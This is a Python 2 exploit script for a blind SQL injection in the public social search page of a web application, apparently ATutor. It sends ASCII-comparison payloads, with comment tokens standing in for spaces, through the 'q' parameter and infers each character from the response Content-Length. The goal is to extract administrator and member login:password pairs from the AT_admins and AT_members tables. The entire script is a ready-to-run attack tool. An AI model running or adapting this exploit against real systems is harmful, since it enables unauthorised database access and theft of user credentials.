import sys 
import requests 

 
		

def searchFriends_sqli(ip,inj_str):
	for j in range(32,126):
		
		target = "http://%s/mods/_standard/social/index_public.php?q=%s" % (ip ,inj_str.replace("[CHAR]", str(j) ) )
		r = requests.get(target)
		content_length = int(r.headers['Content-Length'])
		if (content_length > 20 ) :
			return j
	return None 
	
		
		
		
		
def inject(r,inj,ip):
	extracted = ""
	for i in range(1,r):
		injection_string = "test'/**/or/**/(ascii(substring((%s),%d,1)))=[CHAR]/**/or/**/1='" % (inj,i)
		retrieved_value = searchFriends_sqli(ip, injection_string)
		if(retrieved_value):
			extracted += chr(retrieved_value)
			extracted_char =chr(retrieved_value)
			sys.stdout.write(extracted_char)
			sys.stdout.flush() 
		else : 
			print "\n [+] done" 
			break
	return extracted
		 
		
		
def main() : 
	if len(sys.argv) != 2:	
		print " usage : %s <target> "% sys.argv[0]
		sys.exit(-1)
	ip = sys.argv[1]

	
	print " [+] Retrevieving Username : "
	query = "select/**/concat(login,0x3a,password)/**/from/**/AT_admins/**/limit/**/0,1"
	query2 = "select/**/concat(login,0x3a,password)/**/from/**/AT_members/**/limit/**/0,1"
	user_and_password = inject(50,query,ip)
	print "\n [+] credentials: %s " %(user_and_password) 
	print "\n "
	user_and_password = inject(50,query2,ip)
 	print "\n [+] credentials: %s " %(user_and_password) 
	
	
	 


if __name__ == "__main__":
	main()
